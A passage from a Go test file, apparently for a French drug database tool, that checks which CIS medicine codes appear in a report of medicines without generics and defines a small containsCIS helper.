		t.Errorf("Expected CIS 10000004 in list, got %v", report.MedicamentsWithoutGeneriquesCIS)
	}
	if containsCIS(report.MedicamentsWithoutGeneriquesCIS, 10000001) {
		t.Errorf("Should not contain CIS 10000001 (in multiple generiques), got %v", report.MedicamentsWithoutGeneriquesCIS)
	}
}

func containsCIS(cisList []int, cis int) bool {
	return slices.Contains(cisList, cis)
}
